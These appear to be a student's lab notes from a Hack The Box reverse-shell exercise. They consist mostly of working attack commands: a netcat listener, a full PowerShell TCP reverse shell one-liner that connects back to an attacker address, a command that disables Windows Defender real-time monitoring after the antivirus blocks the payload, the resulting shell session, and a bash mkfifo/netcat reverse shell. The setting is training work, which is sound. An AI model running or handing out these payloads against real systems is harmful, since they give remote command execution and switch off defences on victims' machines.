![[Pasted image 20260502133159.png]]
## [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

#### Server (`attack box`)

```shell
3kjS@htb[/htb]$ sudo nc -lvnp 443 Listening on 0.0.0.0 443
```
#### Client (target)

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### Client (target)

```cmd
At line:1 char:1 + $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ This script contains malicious content and has been blocked by your antivirus software. + CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
#### Disable AV

```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```
#### Server (attack box)

```Shell
3kjS@htb[/htb]$ sudo nc -lvnp 443 

Listening on 0.0.0.0 443 
Connection received on 10.129.36.68 49674 

PS C:\Users\htb-student> whoami 
ws01\htb-student
```
___
## One-Liners Examined

#### Netcat/Bash Reverse Shell One-liner

```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
## PowerShell One-liner Explained
#### Powershell One-liner

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

